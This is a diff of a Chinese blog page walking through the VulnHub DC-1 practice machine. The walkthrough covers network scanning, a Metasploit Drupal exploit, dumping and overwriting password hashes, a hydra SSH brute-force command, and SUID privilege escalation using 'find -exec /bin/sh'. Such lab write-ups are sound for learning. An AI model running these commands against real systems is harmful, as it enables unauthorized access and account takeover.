@@ -6,7 +6,7 @@
     <meta name="referrer" content="origin">
     <meta http-equiv="Cache-Control" content="no-transform">
     <meta http-equiv="Cache-Control" content="no-siteapp">
-    <title>vulnhub-DC系列通关记靶机渗透</title>
+    <title>vulnhub-DC1</title>
 
     <link type="text/css" rel="stylesheet" href="https://cdn.jsdelivr.net/gh/first19326/cdn@master/static/font/LongCang.css">
     <link type="text/css" rel="stylesheet" href="https://cdn.jsdelivr.net/gh/first19326/cdn@master/static/font/Monda.css">
@@ -31,14 +31,14 @@
     <div class="header">
         <div class="vertical">
             <div class="inner">
-                <h1 class="header-subtitle">vulnhub-DC系列通关记靶机渗透</h1>
+                <h1 class="header-subtitle">vulnhub-DC1</h1>
                 <div class="header-subinfo">
                     <p class="article-info-text">
                         <span>
                             <i class="iconfont icon-time"></i> 发表时间：2021-06-17
                         </span>
                         
-                            <span id="/2021/06/17/vulnhub-DC1/" class="leancloud_visitors" data-flag-title="vulnhub-DC系列通关记靶机渗透">
+                            <span id="/2021/06/17/vulnhub-DC1/" class="leancloud_visitors" data-flag-title="vulnhub-DC1">
                                 <i class="iconfont icon-browse"></i> 阅读：<sapn class="leancloud-visitors-count"></span>
                             </span>
                         
@@ -58,7 +58,7 @@
     <div class="toc"></div>
     <div class="article-body">
         <p>首先下载靶机，然后导入进去，注意网络设置，要和攻击机一样</p>
-<h1 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h1><p>先端口扫描，找到靶机的IP</p>
+<h1 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h1><h2 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h2><p>先端口扫描，找到靶机的IP</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap 192.168.139.0&#x2F;24</span><br></pre></td></tr></table></figure>
 <p><img src="/image/dc1-1.png"><br>知道了ip，我们仔细的扫描一下<br><img src="/image/dc1-2.png"><br>可以看到，开发了三个端口22，80，111<br>下面是网站<br><img src="/image/dc1-3.png"><br>可以用这个插件查看到一些信息<br><img src="/image/dc1-4.png"></p>
 <h2 id="国外三大开源php-CMS"><a href="#国外三大开源php-CMS" class="headerlink" title="国外三大开源php CMS"></a>国外三大开源php CMS</h2><p>drupal        【无专用扫描器，但是msf内置了模块】<br>wordpress     【有专用扫描器】<br>joomla        【有专用扫描器】</p>
@@ -74,16 +74,36 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">-T选项包含很多小选项 –T 9表示扫描SQL注入漏洞</span><br><span class="line">-T选项包含的小选项解释：</span><br><span class="line">0 检查文件上传页面</span><br><span class="line">1 检查web日志</span><br><span class="line">2 检查错误配置或默认文件</span><br><span class="line">3检查信息泄露问题</span><br><span class="line">4 检查XSS&#x2F;Script&#x2F;HTML问题</span><br><span class="line">5 从根目录检查是否存在可访问的文件</span><br><span class="line">6 检查拒绝服务问题</span><br><span class="line">7 从任意文件检索是否存在可访问文件</span><br><span class="line">8 检查是否存在系统命令执行漏洞</span><br><span class="line">9 检查SQL注入漏洞</span><br><span class="line">a 检查认证绕过问题</span><br><span class="line">b 识别安装的软件版本</span><br><span class="line">c 检查源代码泄露问题</span><br><span class="line">x 反向链接选项</span><br><span class="line"></span><br><span class="line">如：扫描sql注入漏洞</span><br><span class="line">nikto -h 192.168.3.111 -T 9</span><br></pre></td></tr></table></figure>
 <p><img src="/image/dc1-5.png"></p>
 <p>版本号出来了</p>
-<p>打开msf<br>Msfconsole<br><img src="/image/dc1-6.png"></p>
-<p>有2018的和2019的，我们先用2018的试试<br><img src="/image/dc1-7.png"><br><img src="/image/dc1-8.png"><br><img src="/image/dc1-9.png"><br><img src="/image/dc1-10.png"><br>前面一直用的是win10，但是发现进去shell之后，什么命令都不会执行，然后就换成了kali就可以了<br>这个时候需要注意，不能直接msf进入，因为msf是从web服务打进去的，而HTTP是瞬时协议，需要让python来做一个中介<br><img src="/image/dc1-11.png"></p>
+<h1 id="渗透攻击"><a href="#渗透攻击" class="headerlink" title="渗透攻击"></a>渗透攻击</h1><h2 id="msf"><a href="#msf" class="headerlink" title="msf"></a>msf</h2><p>打开msf<br>Msfconsole</p>
+<p><img src="/image/dc1-6.png"></p>
+<p>有2018的和2019的，我们先用2018的试试</p>
+<p><img src="/image/dc1-7.png"><br><img src="/image/dc1-8.png"><br><img src="/image/dc1-9.png"><br><img src="/image/dc1-10.png"></p>
+<p>前面一直用的是win10，但是发现进去shell之后，什么命令都不会执行，然后就换成了kali就可以了<br>这个时候需要注意，不能直接msf进入，因为msf是从web服务打进去的，而HTTP是瞬时协议，需要让python来做一个中介</p>
+<p><img src="/image/dc1-11.png"></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">交互式shell </span><br><span class="line">python3 -c &#39;import pty; pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39; </span><br><span class="line">或者</span><br><span class="line">python -c &#39;import pty; pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;</span><br></pre></td></tr></table></figure>
-<p><img src="/image/dc1-12.png"><br>有了python中介，进入数据库，就是这么神奇，我也没搞明白怎么就进去了<br><img src="/image/dc1-13.png"><br><img src="/image/dc1-14.png"><br>\G表示将查询结果进行按列打印，可以使每个字段打印到单独的行<br><img src="/image/dc1-15.png"><br>uid: 1<br>name: admin<br>pass: $S$DvQI6Y600iNeXRIeEMF94Y6FvN8nujJcEDTCP9nS5.i38jnEKuDR<br>mail: <a href="mailto:&#x61;&#x64;&#109;&#105;&#x6e;&#64;&#101;&#x78;&#x61;&#109;&#112;&#x6c;&#x65;&#x2e;&#99;&#111;&#109;">&#x61;&#x64;&#109;&#105;&#x6e;&#64;&#101;&#x78;&#x61;&#109;&#112;&#x6c;&#x65;&#x2e;&#99;&#111;&#109;</a></p>
-<p>uid: 2<br>name: Fred<br>pass: $S$DWGrxef6.D0cwB5Ts.GlnLw15chRRWH2s1R3QBwC0EkvBQ/9TCGg<br>mail: <a href="mailto:&#x66;&#114;&#x65;&#x64;&#x40;&#x65;&#x78;&#x61;&#x6d;&#x70;&#x6c;&#x65;&#46;&#x6f;&#x72;&#103;">&#x66;&#114;&#x65;&#x64;&#x40;&#x65;&#x78;&#x61;&#x6d;&#x70;&#x6c;&#x65;&#46;&#x6f;&#x72;&#103;</a></p>
-<p>这密码一看就很难破解<br>所以我们就想着把原来的密码给覆盖掉<br>现在生成一个密码，明文为：moss<br>php scripts/password-hash.sh moss</p>
-<p><img src="/image/dc1-16.png"><br>再进入数据库<br><img src="/image/dc1-17.png"><br><img src="/image/dc1-18.png"><br><img src="/image/dc1-19.png"><br>登录成功<br><img src="/image/dc1-20.png"></p>
-<p>这个提示的意思大概是通过EXEC得到密码吧？<br>但是听说passwd有这个文件，在/etc/passwd<br>不知道为什么参考其他博客他们都不能直接访问里面的东西，但是我的可以<br><img src="/image/dc1-21.png"><br><img src="/image/dc1-22.png"><br><img src="/image/dc1-23.png"><br>我一看到这个我就想着去里面找他，直接打开就完事<br><img src="/image/dc1-24.png"><br>但是吧，更别人的不太一样，所以下面我就按照大家的方法再来一遍<br>因为前面扫描到ssh服务打开了，所以我们就来一次爆破</p>
-<h2 id="hydra"><a href="#hydra" class="headerlink" title="hydra"></a>hydra</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~$ hydra -l flag4 -P &#x2F;usr&#x2F;share&#x2F;john&#x2F;password.lst 192.168.139.136 ssh -vV -f</span><br></pre></td></tr></table></figure>
-<p>-p参数要大写P，大写P，大写P指定密码字典文件，小写p是指定密码<br>-l指定用户名<br>-P指定密码字典文件<br>-vV爆破一次在终端打印一行<br>-f成功爆破密码后，停止爆破<br><img src="/image/dc1-25.png"><br>然后，我们就可以登录了<br><img src="/image/dc1-26.png"></p>
+<p><img src="/image/dc1-12.png"></p>
+<p>有了python中介，进入数据库，就是这么神奇，我也没搞明白怎么就进去了</p>
+<p><img src="/image/dc1-13.png"><br><img src="/image/dc1-14.png"></p>
+<p>\G表示将查询结果进行按列打印，可以使每个字段打印到单独的行</p>
+<p><img src="/image/dc1-15.png"></p>
+<p>uid: 1<br>name: admin<br>pass: $S$DvQI6Y600iNeXRIeEMF94Y6FvN8nujJcEDTCP9nS5.i38jnEKuDR<br>mail: <a href="mailto:&#97;&#x64;&#x6d;&#x69;&#x6e;&#x40;&#101;&#120;&#97;&#x6d;&#112;&#x6c;&#101;&#x2e;&#99;&#111;&#109;">&#97;&#x64;&#x6d;&#x69;&#x6e;&#x40;&#101;&#120;&#97;&#x6d;&#112;&#x6c;&#101;&#x2e;&#99;&#111;&#109;</a></p>
+<p>uid: 2<br>name: Fred<br>pass: $S$DWGrxef6.D0cwB5Ts.GlnLw15chRRWH2s1R3QBwC0EkvBQ/9TCGg<br>mail: <a href="mailto:&#102;&#114;&#101;&#100;&#64;&#101;&#x78;&#97;&#x6d;&#112;&#x6c;&#x65;&#x2e;&#x6f;&#114;&#x67;">&#102;&#114;&#101;&#100;&#64;&#101;&#x78;&#97;&#x6d;&#112;&#x6c;&#x65;&#x2e;&#x6f;&#114;&#x67;</a></p>
+<h2 id="拿下数据库root账户"><a href="#拿下数据库root账户" class="headerlink" title="拿下数据库root账户"></a>拿下数据库root账户</h2><p>这密码一看就很难破解<br>所以我们就想着把原来的密码给覆盖掉<br>现在生成一个密码，明文为：moss<br>php scripts/password-hash.sh moss</p>
+<p><img src="/image/dc1-16.png"></p>
+<h2 id="进入数据库"><a href="#进入数据库" class="headerlink" title="进入数据库"></a>进入数据库</h2><p><img src="/image/dc1-17.png"><br><img src="/image/dc1-18.png"><br><img src="/image/dc1-19.png"></p>
+<p>登录成功</p>
+<p><img src="/image/dc1-20.png"></p>
+<p>这个提示的意思大概是通过EXEC得到密码吧？<br>但是听说passwd有这个文件，在/etc/passwd<br>不知道为什么参考其他博客他们都不能直接访问里面的东西，但是我的可以</p>
+<p><img src="/image/dc1-21.png"><br><img src="/image/dc1-22.png"><br><img src="/image/dc1-23.png"></p>
+<p>我一看到这个我就想着去里面找他，直接打开就完事</p>
+<p><img src="/image/dc1-24.png"></p>
+<p>但是吧，更别人的不太一样，所以下面我就按照大家的方法再来一遍<br>因为前面扫描到ssh服务打开了，所以我们就来一次爆破</p>
+<h2 id="hydra爆破ssh"><a href="#hydra爆破ssh" class="headerlink" title="hydra爆破ssh"></a>hydra爆破ssh</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~$ hydra -l flag4 -P &#x2F;usr&#x2F;share&#x2F;john&#x2F;password.lst 192.168.139.136 ssh -vV -f</span><br></pre></td></tr></table></figure>
+<p>-p参数要大写P，大写P，大写P指定密码字典文件，小写p是指定密码<br>-l指定用户名<br>-P指定密码字典文件<br>-vV爆破一次在终端打印一行<br>-f成功爆破密码后，停止爆破</p>
+<p><img src="/image/dc1-25.png"></p>
+<p>然后，我们就可以登录了</p>
+<p><img src="/image/dc1-26.png"></p>
+<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>探测SUID和sudo -l，结果发现find就有SUID</p>
 <p>这时候我们查看下该系统是否存在具有SUID标识的命令，SUID标识的命令，是在执行这些具有SUID标识的命令的运行期间会获取root权限<br>比如bash命令，运行bash命令时有SUID标识，SUID标识会继承root权限，就好比A信任B，B信任C，那么A就可以间接的信任C，信任是具有传递性的<br>有SUID标识的命令调用B命令运行，SUID标识的命令调用B命令期间SUID标识的命令获取root权限，B命令也获取了root权限<br>下面这条命令可以查看当前系统有哪些具有SUID标识的命令</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">find &#x2F; -perm -4000 2&gt;&#x2F;dev&#x2F;null</span><br><span class="line">使用下面这条命令提权，注意这条命令里一个字符不能多也不能少，该空格就空格</span><br><span class="line">find -exec &quot;&#x2F;bin&#x2F;sh&quot; \;</span><br></pre></td></tr></table></figure>
 <p><img src="/image/dc1-27.png"></p>
@@ -96,7 +116,7 @@
             <div class="suffix-box-right">
                 <span class="suffix-box-title">文章作者</span>：moss
                 <br>
-                <span class="suffix-box-title">文章出处</span>：<a href="/2021/06/17/vulnhub-DC1/" target="_blank">vulnhub-DC系列通关记靶机渗透</a>
+                <span class="suffix-box-title">文章出处</span>：<a href="/2021/06/17/vulnhub-DC1/" target="_blank">vulnhub-DC1</a>
                 <br>
                 <span class="suffix-box-title">作者签名</span>：等花开，等风来
                 <br>
@@ -119,6 +139,9 @@
         
         
         <div class="article-prev-next">
+            
+                <a href="/2021/06/17/vulnhub-DC2/" class="prev-prefix">« </a> 上一篇：    <a href="/2021/06/17/vulnhub-DC2/" title="发布于 2021-06-17 04:33">vulnhub-DC2</a>
+                <br>
             
             
                 <a href="/2021/06/01/%E7%BD%91%E7%BB%9C%E5%B7%A5%E7%A8%8B%E5%B8%88%E9%9D%A2%E8%AF%95%E9%A2%98/" class="next-prefix">» </a> 下一篇：    <a href="/2021/06/01/%E7%BD%91%E7%BB%9C%E5%B7%A5%E7%A8%8B%E5%B8%88%E9%9D%A2%E8%AF%95%E9%A2%98/" title="发布于 2021-06-01 04:26">网络工程师面试题</a>
